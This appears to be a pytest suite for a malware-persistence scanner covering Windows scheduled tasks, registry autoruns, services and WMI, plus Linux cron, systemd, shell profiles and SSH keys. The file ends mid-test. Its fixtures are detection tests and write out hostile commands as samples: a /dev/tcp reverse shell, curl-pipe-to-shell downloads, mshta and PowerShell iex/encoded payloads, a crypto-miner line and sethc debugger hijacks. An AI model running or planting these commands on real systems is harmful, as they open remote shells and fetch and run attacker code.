"""Tests for aegis.scanners.persistence: parsing, decisions and a live Linux run."""

import os
import plistlib

import pytest

from aegis.core.config import Config
from aegis.core.models import CheckResult, Finding, Severity
from aegis.core.signatures import SignatureDB
from aegis.scanners import persistence as ps
from aegis.scanners.base import ScanContext

S = Severity


@pytest.fixture
def ctx(tmp_path, monkeypatch):
    monkeypatch.setenv("AEGIS_HOME", str(tmp_path / "home"))
    cfg = Config()
    return ScanContext(cfg, SignatureDB(cfg))


def never_missing(_p):  # pretend every target exists
    return True


def assess(e, sig=None, scan=(), exists=never_missing):
    return ps.assess_entry(e, sig, scan, exists)


def sev(e, **kw):
    return ps.combined_severity(assess(e, **kw))


# --------------------------------------------------------------------------- task XML

TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>{author}</Author>
    <URI>\\{name}</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <TimeTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Enabled>{enabled}</Enabled><Hidden>{hidden}</Hidden></Settings>
  <Actions Context="Author">
    <Exec><Command>{command}</Command><Arguments>{args}</Arguments></Exec>
  </Actions>
</Task>
"""


def task_bytes(command, args="", name="Updater", author="Bob", hidden="false", enabled="true", encoding="utf-16"):
    xml = TASK_XML.format(command=command, args=args, name=name, author=author, hidden=hidden, enabled=enabled)
    if encoding == "utf-8":
        xml = xml.replace('encoding="UTF-16"', 'encoding="UTF-8"')
    return xml.encode(encoding)  # utf-16 adds the BOM like Task Scheduler does


def test_parse_task_xml_utf16_with_bom():
    data = task_bytes(r"C:\Users\bob\AppData\Local\Temp\a.exe", "/s -x", hidden="true")
    assert data[:2] == b"\xff\xfe"
    info = ps.parse_task_xml(data)
    assert info["author"] == "Bob" and info["hidden"] is True and info["enabled"] is True
    assert info["run_level"] == "HighestAvailable" and info["triggers"] == ["LogonTrigger", "TimeTrigger"]
    assert info["repetition_min"] == 5
    assert info["actions"] == [{"kind": "Exec", "command": r"C:\Users\bob\AppData\Local\Temp\a.exe", "arguments": "/s -x", "workdir": ""}]


def test_parse_task_xml_utf8_and_bom_variants():
    assert ps.parse_task_xml(task_bytes("cmd.exe", "/c dir", encoding="utf-8"))["actions"][0]["command"] == "cmd.exe"
    utf8_bom = b"\xef\xbb\xbf" + task_bytes("cmd.exe", encoding="utf-8")
    assert ps.parse_task_xml(utf8_bom)["actions"][0]["command"] == "cmd.exe"
    le_nobom = task_bytes("cmd.exe").decode("utf-16").encode("utf-16-le")  # UTF-16 without BOM
    assert ps.parse_task_xml(le_nobom)["actions"][0]["command"] == "cmd.exe"


def test_parse_task_xml_disabled_and_com_handler():
    xml = ("<Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'><Settings><Enabled>false</Enabled></Settings>"
           "<Actions><ComHandler><ClassId>{1234}</ClassId></ComHandler></Actions></Task>").encode("utf-16")
    info = ps.parse_task_xml(xml)
    assert info["enabled"] is False and info["actions"] == [{"kind": "ComHandler", "clsid": "{1234}"}]
    assert ps.task_entries("\\X", "loc", info) == []  # COM-handler-only tasks produce no Exec entries


def test_iso_duration():
    assert ps.iso_duration_minutes("PT5M") == 5 and ps.iso_duration_minutes("PT1H30M") == 90
    assert ps.iso_duration_minutes("P1D") == 1440 and ps.iso_duration_minutes("junk") is None


def test_collect_tasks_walks_directory(tmp_path):
    root = tmp_path / "Tasks"
    (root / "Microsoft" / "Windows" / "Foo").mkdir(parents=True)
    (root / "Updater").write_bytes(task_bytes(r"C:\Users\bob\AppData\Local\Temp\a.exe", "/s"))
    (root / "Microsoft" / "Windows" / "Foo" / "Bar").write_bytes(
        task_bytes(r"%windir%\system32\foo.exe", author="Microsoft Corporation"))
    (root / "Broken").write_bytes(b"not xml at all")
    entries = ps.collect_tasks(root)
    names = sorted(e["name"] for e in entries)
    assert names == ["\\Microsoft\\Windows\\Foo\\Bar", "\\Updater"]
    bar = next(e for e in entries if e["name"].endswith("Bar"))
    assert bar["meta"]["microsoft"] is True and bar["path"].lower().endswith(r"\system32\foo.exe")
    assert bar["meta"]["remediation"]["action"] == "disable_task"


def test_task_assessment_flags_user_writable_unsigned_and_stacks_modifiers():
    info = ps.parse_task_xml(task_bytes(r"C:\Users\bob\AppData\Local\Temp\a.exe", "/s", hidden="true"))
    e = ps.task_entries("\\Updater", "x", info)[0]
    reasons = assess(e)
    assert any(r.kind == "location" for r in reasons)
    assert {"task is hidden", "runs with highest privileges", "repeats every 5 minutes"} <= {r.text for r in reasons if r.kind == "modifier"}
    assert ps.combined_severity(reasons) == S.HIGH  # MEDIUM location + modifiers
    assert sev(e, sig="NotSigned") == S.HIGH
    f = ps.finding_for_entry(e, reasons)
    assert f.rule_id == "AEG-PERS-TASK" and f.remediation.action == "disable_task" and f.location == "Task \\Updater"


def test_microsoft_task_in_system32_is_skipped_unless_suspicious():
    info = ps.parse_task_xml(task_bytes(r"%windir%\system32\defrag.exe", "-c", author="Microsoft Corporation", name="Microsoft\\Windows\\Defrag\\X"))
    e = ps.task_entries("\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "x", info)[0]
    assert assess(e, exists=lambda p: False) == []  # even if the file is missing: MS feature tasks
    # ... but a "Microsoft" task running an encoded PowerShell command is still reported
    bad = ps.parse_task_xml(task_bytes(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                       "-nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA",
                                       author="Microsoft Corporation"))
    be = ps.task_entries("\\Microsoft\\Windows\\Maintenance\\Update", "x", bad)[0]
    assert sev(be) == S.HIGH


def test_disabled_entries_not_reported():
    info = ps.parse_task_xml(task_bytes(r"C:\Users\bob\AppData\Local\Temp\a.exe", enabled="false"))
    e = ps.task_entries("\\Updater", "x", info)[0]
    assert e["enabled"] is False and assess(e) == []


def test_benign_vendor_task_not_flagged():
    info = ps.parse_task_xml(task_bytes(r"C:\Program Files\Backup\run.exe", "--daily", name="BackupDaily", author="Acme"))
    assert sev(ps.task_entries("\\BackupDaily", "x", info)[0]) == S.INFO


# --------------------------------------------------------------------------- generic assessment

def run_entry(cmd, name="Updater", **kw):
    return ps.make_entry("registry_run", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", name, cmd, **kw)


def test_missing_target_is_low_and_deletion_offered():
    e = run_entry(r'"C:\Program Files\Gone\gone.exe" /bg')
    r = assess(e, exists=lambda p: False)
    assert [(x.kind, x.severity) for x in r] == [("missing", S.LOW)]
    assert ps.combined_severity(r) == S.LOW
    assert sev(e) == S.INFO  # target exists -> fine


def test_user_writable_location_and_signature():
    e = run_entry(r"C:\Users\bob\AppData\Local\Temp\a.exe /s")
    assert sev(e) == S.MEDIUM
    assert sev(e, sig="NotSigned") == S.HIGH
    assert sev(e, sig="Valid") == S.LOW
    good = run_entry(r"C:\Users\bob\AppData\Local\Discord\Update.exe --processStart Discord.exe", name="Discord")
    assert sev(good) == S.INFO


def test_lolbin_command_lines_flagged():
    enc = r"powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA"
    assert sev(run_entry(enc)) == S.HIGH
    assert sev(run_entry(r"mshta http://evil.example/a.hta")) == S.HIGH
    assert sev(run_entry(r'wscript.exe "C:\Users\bob\Downloads\x.vbs"')) >= S.MEDIUM
    assert sev(run_entry(r"powershell.exe -NoProfile -File C:\Scripts\backup.ps1")) == S.INFO
    assert sev(run_entry(r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window')) == S.INFO


def test_script_host_in_run_key_is_low_without_other_signal():
    r = assess(run_entry(r"wscript.exe C:\Scripts\logon.vbs"))
    assert ps.combined_severity(r) == S.LOW


def test_random_name_stacks_with_location():
    e = run_entry(r"C:\Users\bob\AppData\Roaming\Qwrtpsdfghjk\xkqzvtrwpl.exe", name="xkqzvtrwpl")
    r = assess(e)
    kinds = {x.kind for x in r}
    assert {"location", "random"} <= kinds
    assert ps.combined_severity(r) >= S.MEDIUM
    assert ps.looks_random("xkqzvtrwpl") and ps.looks_random("a3f9c1d2e7b4")


@pytest.mark.parametrize("name", ["OneDrive", "Teams", "chrome.exe", "SecurityHealthSystray", "iTunesHelper", "RtkAudUService64",
                                  "jusched", "ctfmon", "NvBackend", "wmplayer", "wmpnetwk.exe", "NvTmMon", "SgrmBroker",
                                  "GoogleUpdateTaskMachineCore{8A69D345-D564-463C-AFF1-A69D9E530F96}",
                                  "OneDrive Reporting Task-S-1-5-21-123-456-789-1001", "MicrosoftEdgeUpdateTaskMachineUA"])
def test_looks_random_false_positives(name):
    assert not ps.looks_random(name)


def test_scan_hit_escalates_entry():
    hit = Finding("AEG-SIG-HASH", "Known malware: X", S.CRITICAL, "malware")
    e = run_entry(r"C:\Program Files\Foo\foo.exe")
    r = assess(e, scan=[hit])
    assert ps.combined_severity(r) == S.CRITICAL
    f = ps.finding_for_entry(e, r)
    assert f.category == "malware" and f.severity == S.CRITICAL


def test_finding_remediation_and_location_for_registry_run():
    e = ps.make_entry("registry_run", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Bad",
                      r"C:\Users\bob\AppData\Local\Temp\a.exe",
                      remediation=ps._run_remediation("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run", "Bad", True))
    f = ps.finding_for_entry(e, assess(e, sig="NotSigned"))
    assert f.remediation.action == "delete_registry_value"
    assert f.remediation.params == {"hive": "HKCU", "key": r"Software\Microsoft\Windows\CurrentVersion\Run", "value": "Bad", "view64": True}
    assert f.location.endswith(r"\Run\Bad") and f.scanner == "persistence" and "T1547.001" in f.mitre


# --------------------------------------------------------------------------- registry collectors (mocked registry)

class FakeReg:
    def __init__(self, values=None, subkeys=None):
        self.values = {(h, k.lower(), v): d for (h, k, v), d in (values or {}).items()}
        self.subkeys = {(h, k.lower()): s for (h, k), s in (subkeys or {}).items()}

    def reg_values(self, hive, key, view64=True):
        return {v: d for (h, k, v), d in self.values.items() if h == hive and k == key.lower()}

    def reg_read(self, hive, key, value, view64=True):
        return self.values.get((hive, key.lower(), value))

    def reg_subkeys(self, hive, key, view64=True):
        return list(self.subkeys.get((hive, key.lower()), []))


def install(monkeypatch, fake):
    monkeypatch.setattr(ps, "reg_values", fake.reg_values)
    monkeypatch.setattr(ps, "reg_read", fake.reg_read)
    monkeypatch.setattr(ps, "reg_subkeys", fake.reg_subkeys)


RUN = r"Software\Microsoft\Windows\CurrentVersion\Run"


def test_collect_run_keys_with_startup_approved(monkeypatch):
    fake = FakeReg({
        ("HKCU", RUN, "OneDrive"): r'"C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background',
        ("HKCU", RUN, "Disabled1"): r"C:\Tools\x.exe",
        ("HKCU", RUN, ""): "ignored default value",
        ("HKCU", RUN, "NotAString"): 5,
        ("HKLM", RUN, "SecurityHealth"): r"%windir%\system32\SecurityHealthSystray.exe",
        ("HKCU", ps.APPROVED_BASE + r"\Run", "Disabled1"): b"\x03\x00\x00\x00",
        ("HKCU", ps.APPROVED_BASE + r"\Run", "OneDrive"): b"\x02\x00\x00\x00",
    })
    install(monkeypatch, fake)
    entries = ps.collect_run_keys()
    by = {e["name"]: e for e in entries}
    assert set(by) == {"OneDrive", "Disabled1", "SecurityHealth"}
    assert by["Disabled1"]["enabled"] is False and by["OneDrive"]["enabled"] is True
    assert by["SecurityHealth"]["path"] == r"C:\Windows\system32\SecurityHealthSystray.exe"
    assert by["OneDrive"]["meta"]["remediation"]["params"]["hive"] == "HKCU"
    assert assess(by["Disabled1"]) == []


def test_startup_approved_enabled():
    assert ps.startup_approved_enabled(b"\x02\x00") and ps.startup_approved_enabled(b"\x06")
    assert not ps.startup_approved_enabled(b"\x03") and not ps.startup_approved_enabled(b"\x07")
    assert ps.startup_approved_enabled(None)


def test_winlogon_defaults_clean_and_tampering_flagged(monkeypatch):
    good = {"Shell": "explorer.exe", "Userinit": r"C:\Windows\system32\userinit.exe,", "Taskman": ""}
    assert ps.winlogon_reasons(good) == []
    bad = {"Shell": r"explorer.exe, C:\Users\bob\evil.exe", "Userinit": r"C:\Windows\system32\userinit.exe,C:\x\evil.exe",
           "Taskman": r"C:\x\tm.exe"}
    names = {n for n, _d, _r in ps.winlogon_reasons(bad)}
    assert names == {"Shell", "Userinit", "Taskman"}
    install(monkeypatch, FakeReg({("HKLM", ps.WINLOGON_KEY, "Shell"): "evil.exe"}))
    e = ps.collect_winlogon()[0]
    assert e["type"] == "winlogon" and e["meta"]["remediation"]["action"] == "set_registry_value"
    assert e["meta"]["remediation"]["params"]["data"] == "explorer.exe"
    assert sev(e) == S.HIGH


def test_ifeo_reasons():
    assert ps.ifeo_reason("sethc.exe", r"C:\Windows\System32\cmd.exe")["severity"] == "CRITICAL"
    assert ps.ifeo_reason("osk.exe", "cmd.exe")["severity"] == "CRITICAL"
    assert ps.ifeo_reason("taskmgr.exe", r"C:\Tools\procexp.exe") is None  # Process Explorer replacement is legit
    assert ps.ifeo_reason("notepad.exe", r"C:\Program Files\Microsoft Visual Studio\Common\vsjitdebugger.exe -p %ld")is None
    assert ps.ifeo_reason("msmpeng.exe", "ntsd -d")["severity"] == "HIGH"
    assert ps.ifeo_reason("myapp.exe", r"C:\x\dbg.exe")["severity"] == "MEDIUM"


def test_collect_ifeo_accessibility_and_silent_process_exit(monkeypatch):
    base = ps.IFEO_KEY
    fake = FakeReg(
        {("HKLM", base + r"\sethc.exe", "Debugger"): r"C:\Windows\System32\cmd.exe",
         ("HKLM", base + r"\notepad.exe", "GlobalFlag"): 512,
         ("HKLM", base + r"\msmpeng.exe", "Debugger"): "ntsd -d",
         ("HKLM", ps.SPE_KEY + r"\lsass.exe", "MonitorProcess"): r"C:\Temp\dump.exe"},
        {("HKLM", base): ["sethc.exe", "notepad.exe", "msmpeng.exe"], ("HKLM", ps.SPE_KEY): ["lsass.exe"]})
    install(monkeypatch, fake)
    entries = ps.collect_ifeo()
    kinds = sorted((e["type"], e["name"]) for e in entries)
    assert ("accessibility", "Debugger") in kinds and ("silentprocessexit", "MonitorProcess") in kinds
    sethc = next(e for e in entries if e["type"] == "accessibility")
    assert sev(sethc) == S.CRITICAL
    f = ps.finding_for_entry(sethc, assess(sethc))
    assert f.rule_id == "AEG-PERS-ACCESS" and f.remediation.action == "delete_registry_value"
    spe = next(e for e in entries if e["type"] == "silentprocessexit")
    assert sev(spe) == S.HIGH


def test_accessibility_file_replaced_with_cmd(tmp_path):
    sys32 = tmp_path
    (sys32 / "cmd.exe").write_bytes(b"MZcmdbinary" * 100)
    (sys32 / "sethc.exe").write_bytes(b"MZcmdbinary" * 100)
    (sys32 / "utilman.exe").write_bytes(b"MZutilman" * 100)
    entries = ps.collect_accessibility_files(sys32)
    assert [e["name"] for e in entries] == ["sethc.exe"]
    assert sev(entries[0]) == S.CRITICAL


def test_appinit_and_appcert(monkeypatch):
    key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    fake = FakeReg({("HKLM", key, "AppInit_DLLs"): r"C:\Temp\evil.dll", ("HKLM", key, "LoadAppInit_DLLs"): 1,
                    ("HKLM", r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls", "x"): r"C:\Temp\cert.dll"})
    install(monkeypatch, fake)
    entries = ps.collect_appinit()
    types = {e["type"] for e in entries}
    assert types == {"appinit", "appcert"}
    assert all(sev(e) == S.HIGH for e in entries)
    # AppInit_DLLs present but loading disabled -> not reported
    fake2 = FakeReg({("HKLM", key, "AppInit_DLLs"): r"C:\Temp\evil.dll", ("HKLM", key, "LoadAppInit_DLLs"): 0})
    install(monkeypatch, fake2)
    assert all(not e["enabled"] for e in ps.collect_appinit())


def test_lsa_reasons_allow_list():
    exists = lambda p: p.lower() in ("kerberos.dll", "msv1_0.dll", "scecli.dll")
    assert ps.lsa_reasons("Authentication Packages", ["msv1_0"], exists) == []
    assert ps.lsa_reasons("Notification Packages", ["scecli", "rassfm"], exists) == []
    assert ps.lsa_reasons("Security Packages", ["kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u", ""], exists) == []
    r = ps.lsa_reasons("Notification Packages", ["scecli", "mimilib"], exists)
    assert [p for p, _ in r] == ["mimilib"] and r[0][1]["severity"] == "HIGH"
    assert ps.lsa_reasons("Security Packages", ["evilssp"], exists)[0][1]["severity"] == "HIGH"
    assert ps.lsa_reasons("Security Packages", ["knownbutextra"], lambda p: True)[0][1]["severity"] == "MEDIUM"


def test_bootexecute(monkeypatch):
    key = r"SYSTEM\CurrentControlSet\Control\Session Manager"
    install(monkeypatch, FakeReg({("HKLM", key, "BootExecute"): ["autocheck autochk *", r"C:\Temp\x.exe"]}))
    entries = ps.collect_bootexecute()
    assert [e["command"] for e in entries] == [r"C:\Temp\x.exe"] and sev(entries[0]) == S.HIGH


# --------------------------------------------------------------------------- services

def test_service_entries_and_reasons():
    ok = ps.service_entry("Spooler", {"ImagePath": r"%SystemRoot%\System32\spoolsv.exe", "Type": 0x110, "Start": 2}, {})
    assert ok["path"] == r"C:\Windows\System32\spoolsv.exe" and sev(ok) == S.INFO
    drv = ps.service_entry("evil", {"ImagePath": r"\??\C:\Users\bob\AppData\Local\Temp\evil.sys", "Type": 1, "Start": 3}, {})
    assert sev(drv) == S.HIGH and drv["meta"]["remediation"]["action"] == "disable_service"
    host = ps.service_entry("Weird", {"ImagePath": r"C:\Windows\System32\svchost.exe -k netsvcs", "Type": 0x20, "Start": 2},
                            {"ServiceDll": r"C:\Users\Public\dll.dll"})
    assert host["path"] == r"C:\Users\Public\dll.dll" and sev(host) >= S.MEDIUM
    odd_dll = ps.service_entry("W", {"ImagePath": r"C:\Windows\System32\svchost.exe -k x", "Type": 0x20, "Start": 2},
                               {"ServiceDll": r"D:\Weird\w.dll"})
    assert sev(odd_dll) == S.MEDIUM
    vendor = ps.service_entry("Vend", {"ImagePath": r'"C:\Program Files\Vendor\svc.exe" -service', "Type": 0x10, "Start": 2}, {})
    assert sev(vendor) == S.INFO
    psexec = ps.service_entry("PSEXESVC", {"ImagePath": r"%SystemRoot%\PSEXESVC.exe", "Type": 0x10, "Start": 3}, {})
    assert sev(psexec) == S.MEDIUM
    cmdsvc = ps.service_entry("x1", {"ImagePath": r"%COMSPEC% /c echo abc > \\.\pipe\xyz", "Type": 0x10, "Start": 3}, {})
    assert sev(cmdsvc) == S.HIGH
    assert ps.service_entry("NoImage", {"Type": 0x10}, {}) is None
    assert ps.service_entry("Adapter", {"ImagePath": "x.sys", "Type": 4}, {}) is None  # not a service/driver type we track
    disabled = ps.service_entry("D", {"ImagePath": r"C:\Temp\x.exe", "Type": 0x10, "Start": 4}, {})
    assert disabled["enabled"] is False and assess(disabled) == []


def test_collect_services_from_registry(monkeypatch):
    base = ps.SERVICES_KEY
    fake = FakeReg({("HKLM", base + r"\Foo", "ImagePath"): r"C:\Temp\foo.exe", ("HKLM", base + r"\Foo", "Type"): 0x10,
                    ("HKLM", base + r"\Foo", "Start"): 2},
                   {("HKLM", base): ["Foo", "Empty"]})
    install(monkeypatch, fake)
    entries = ps.collect_services()
    assert [e["name"] for e in entries] == ["Foo"] and sev(entries[0]) >= S.MEDIUM


# --------------------------------------------------------------------------- WMI

def test_wmi_entries():
    data = {
        "Filters": [{"Name": "F1", "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60", "EventNamespace": "root\\cimv2"}],
        "Consumers": [
            {"Name": "SCM Event Log Consumer", "Class": "NTEventLogEventConsumer"},
            {"Name": "Evil", "Class": "CommandLineEventConsumer", "CommandLineTemplate": "powershell.exe -nop -c iex(iwr http://x/a)"},
            {"Name": "Scr", "Class": "ActiveScriptEventConsumer", "ScriptingEngine": "VBScript", "ScriptText": "Set o=CreateObject(...)"},
        ],
        "Bindings": [{"Filter": "F1", "Consumer": "Evil"}],
    }
    entries = ps.wmi_entries(data)
    assert [e["name"] for e in entries] == ["Evil", "Scr"]
    assert all(sev(e) == S.HIGH for e in entries)
    evil = entries[0]
    assert evil["meta"]["filters"] == ["F1"] and "InstanceModificationEvent" in evil["meta"]["filter_query"]
    f = ps.finding_for_entry(evil, assess(evil))
    assert f.rule_id == "AEG-PERS-WMI" and f.remediation.action == "remove_wmi_subscription"
    assert f.remediation.params == {"name": "Evil"} and "T1546.003" in f.mitre
    assert ps.wmi_entries(None) == [] and ps.wmi_entries({"Consumers": {"Name": "x", "Class": "SMTPEventConsumer"}})[0]["meta"]["reasons"][0]["severity"] == "LOW"


# --------------------------------------------------------------------------- startup folder

def test_startup_folder_collection(tmp_path):
    d = tmp_path / "Startup"
    d.mkdir()
    (d / "desktop.ini").write_text("[x]")
    (d / "Notes.lnk").write_bytes(b"LNKDATA")
    (d / "dropper.vbs").write_text("MsgBox 1")
    (d / "site.url").write_text("[InternetShortcut]\nURL=https://example.com\n")
    resolver = lambda paths: {str(d / "Notes.lnk").lower(): (r"C:\Program Files\Notes\notes.exe", "/autostart")}
    entries = ps.collect_startup_folders([d], resolver)
    by = {e["name"]: e for e in entries}
    assert set(by) == {"Notes.lnk", "dropper.vbs"}
    assert by["Notes.lnk"]["command"] == r'"C:\Program Files\Notes\notes.exe" /autostart'
    assert by["Notes.lnk"]["path"] == r"C:\Program Files\Notes\notes.exe"
    assert sev(by["Notes.lnk"]) == S.INFO
    assert sev(by["dropper.vbs"]) >= S.MEDIUM  # tmp_path itself is a "user-writable" POSIX location
    f = ps.finding_for_entry(by["dropper.vbs"], assess(by["dropper.vbs"]))
    assert f.remediation.action == "quarantine_file" and f.remediation.params["path"].endswith("dropper.vbs")


def test_parse_lnk_json():
    r = ps.parse_lnk_json([{"Path": r"C:\S\A.lnk", "Target": r"C:\x.exe", "Args": "-a"}, {"Path": r"C:\S\B.lnk", "Target": None}])
    assert r[r"c:\s\a.lnk"] == (r"C:\x.exe", "-a") and r[r"c:\s\b.lnk"] == ("", "")


# --------------------------------------------------------------------------- Linux

def test_parse_crontab_user_and_system():
    text = """# comment
MAILTO=root
SHELL=/bin/sh
*/5 * * * * root /usr/local/bin/backup.sh --full
@reboot root /opt/app/start
17 3 * * 1 root cd /srv && ./job.sh
not a cron line at all here now
"""
    sys_entries = ps.parse_crontab(text, system=True)
    assert sys_entries == [("*/5 * * * *", "root", "/usr/local/bin/backup.sh --full"), ("@reboot", "root", "/opt/app/start"),
                           ("17 3 * * 1", "root", "cd /srv && ./job.sh")]
    user = ps.parse_crontab("0 * * * * curl http://x/a | sh\n@daily /bin/true\n", system=False)
    assert user == [("0 * * * *", "", "curl http://x/a | sh"), ("@daily", "", "/bin/true")]


def test_posix_target():
    assert ps.posix_target("/usr/bin/foo --x") == "/usr/bin/foo"
    assert ps.posix_target("cd /srv && ./job.sh") == "./job.sh"
    assert ps.posix_target("FOO=1 nice -n 5 /opt/x/run.sh") == "/opt/x/run.sh"
    assert ps.posix_target("flock -n /tmp/l /opt/x/run.sh") == "/opt/x/run.sh" or ps.posix_target("flock -n /tmp/l /opt/x/run.sh")
    assert ps.posix_target("curl http://x | sh") == ""


@pytest.fixture
def linux_tree(tmp_path):
    etc = tmp_path / "etc"
    home = tmp_path / "home" / "bob"
    (etc / "cron.d").mkdir(parents=True)
    (etc / "cron.daily").mkdir()
    (etc / "systemd" / "system").mkdir(parents=True)
    (etc / "systemd" / "system" / "multi-user.target.wants").mkdir()
    (etc / "profile.d").mkdir()
    (etc / "udev" / "rules.d").mkdir(parents=True)
    (home / ".ssh").mkdir(parents=True)
    (home / ".config" / "autostart").mkdir(parents=True)
    spool = tmp_path / "spool"
    spool.mkdir()
    return tmp_path, ps.LinuxPaths(etc=etc, spool=(spool,), homes=(home,))


posix_only = pytest.mark.skipif(os.name == "nt", reason="Linux/macOS collectors only run on POSIX systems")


@posix_only
def test_linux_cron_collection_and_assessment(linux_tree):
    root, lp = linux_tree
    (lp.etc / "crontab").write_text("SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    (lp.etc / "cron.d" / "evil").write_text("* * * * * root curl http://1.2.3.4/x.sh | sh\n")
    (lp.etc / "cron.d" / "backup").write_text("0 2 * * * root /usr/local/bin/backup.sh\n")
    (lp.spool[0] / "bob").write_text("*/10 * * * * /tmp/.x/miner -o stratum+tcp://pool:3333\n")
    (lp.etc / "cron.daily" / "logrotate").write_text("#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n")
    (lp.etc / "cron.daily" / "backdoor").write_text("#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    entries = ps.collect_cron(lp)
    flagged = {e["location"].split("/")[-1] + ":" + e["name"][:12]: sev(e, exists=lambda p: p.startswith("/usr")) for e in entries}
    by_loc = {}
    for e in entries:
        by_loc.setdefault(e["location"].split("/")[-1], []).append(sev(e))
    assert max(by_loc["evil"]) >= S.MEDIUM
    assert max(by_loc["bob"]) == S.HIGH
    assert max(by_loc["backdoor" if "backdoor" in by_loc else "cron.daily"]) == S.CRITICAL or any(
        sev(e) == S.CRITICAL for e in entries if e["name"] == "backdoor")
    clean = [e for e in entries if e["name"] in ("logrotate",) or "backup.sh" in e["command"] or "run-parts" in e["command"]]
    assert clean and all(sev(e) == S.INFO for e in clean)


def test_systemd_parse_and_collect(linux_tree):
    root, lp = linux_tree
    unit = """[Unit]
Description=Updater
[Service]
ExecStartPre=-/bin/true
ExecStart=/bin/bash -c 'curl http://1.2.3.4/a | sh'
Restart=always
[Install]
WantedBy=multi-user.target
"""
    assert ps.parse_unit_exec(unit) == [("ExecStartPre", "/bin/true"), ("ExecStart", "/bin/bash -c 'curl http://1.2.3.4/a | sh'")]
    (lp.etc / "systemd" / "system" / "updater.service").write_text(unit)
    (lp.etc / "systemd" / "system" / "good.service").write_text("[Service]\nExecStart=/usr/bin/true\n")
    (lp.etc / "systemd" / "system" / "masked.service").symlink_to("/dev/null")
    entries = ps.collect_systemd(lp)
    names = {e["name"] for e in entries}
    assert "updater.service ExecStart" in names and "masked.service ExecStart" not in names
    bad = next(e for e in entries if e["name"] == "updater.service ExecStart")
    assert sev(bad, exists=lambda p: True) == S.HIGH
    good = next(e for e in entries if e["name"] == "good.service ExecStart")
    assert sev(good) == S.INFO
    # missing ExecStart binary is reported at LOW
    (lp.etc / "systemd" / "system" / "gone.service").write_text("[Service]\nExecStart=/opt/gone/bin/run\n")
    gone = next(e for e in ps.collect_systemd(lp) if e["name"].startswith("gone.service"))
    assert sev(gone, exists=lambda p: False) == S.LOW


def test_shell_rc_and_rc_local(linux_tree):
    root, lp = linux_tree
    home = lp.homes[0]
    (home / ".bashrc").write_text("export PATH=$PATH:~/bin\nalias ll='ls -l'\n")
    (home / ".profile").write_text("# x\ncurl -s http://1.2.3.4/p.sh | bash\n")
    (lp.etc / "profile.d" / "evil.sh").write_text("echo aGk= | base64 -d | sh\n")
    (lp.etc / "rc.local").write_text("#!/bin/sh\nexit 0\n")
    entries = ps.collect_shell_rc(lp) + ps.collect_rc_local(lp)
    res = {e["name"]: sev(e) for e in entries}
    assert res[".bashrc"] == S.INFO and res["rc.local"] == S.INFO
    assert res[".profile"] >= S.HIGH and res["evil.sh"] >= S.HIGH
    f = ps.finding_for_entry(next(e for e in entries if e["name"] == ".profile"),
                             assess(next(e for e in entries if e["name"] == ".profile")))
    assert f.rule_id == "AEG-PERS-SHELLRC"


def test_ld_so_preload(linux_tree):
    root, lp = linux_tree
    assert ps.collect_ld_preload(lp) == []
    (lp.etc / "ld.so.preload").write_text("/lib/x86_64-linux-gnu/libevil.so\n")
    (lp.etc / "ld.so.preload").write_text("/lib/libevil.so\n/usr/lib/libgtk3-nocsd.so.0\n")
    entries = ps.collect_ld_preload(lp)
    res = {e["name"]: sev(e) for e in entries}
    assert res["/lib/libevil.so"] == S.HIGH and res["/usr/lib/libgtk3-nocsd.so.0"] == S.INFO
    f = ps.finding_for_entry(entries[0], assess(entries[0]))
    assert f.rule_id == "AEG-PERS-LDPRELOAD" and "T1574.006" in f.mitre


def test_authorized_keys(linux_tree):
    root, lp = linux_tree
    blob = "AAAAC3NzaC1lZDI1NTE5AAAAIK" + "x" * 30
    lines = [f"ssh-ed25519 {blob} bob@laptop",
             f'command="/usr/bin/rsync --server",no-pty ssh-ed25519 {blob}y backup@host',
             f'command="curl http://1.2.3.4/a|sh" ssh-rsa AAAAB3Nza{"z" * 40} evil']
    (lp.homes[0] / ".ssh" / "authorized_keys").write_text("# keys\n" + "\n".join(lines) + "\n")
    parsed = ps.parse_authorized_keys("\n".join(lines))
    assert [k["comment"] for k in parsed] == ["bob@laptop", "backup@host", "evil"]
    assert parsed[1]["options"].startswith("command=")
    entries = ps.collect_ssh_keys(lp)
    res = {e["name"]: sev(e) for e in entries}
    assert res["bob@laptop"] == S.INFO and res["backup@host"] == S.LOW and res["evil"] >= S.MEDIUM
    # many keys
    many = "\n".join(f"ssh-ed25519 {blob}{i} user{i}" for i in range(12))
    (lp.homes[0] / ".ssh" / "authorized_keys").write_text(many)
    assert sev(ps.collect_ssh_keys(lp)[0]) == S.LOW


def test_udev_and_xdg(linux_tree):
    root, lp = linux_tree
    (lp.etc / "udev" / "rules.d" / "99-x.rules").write_text(
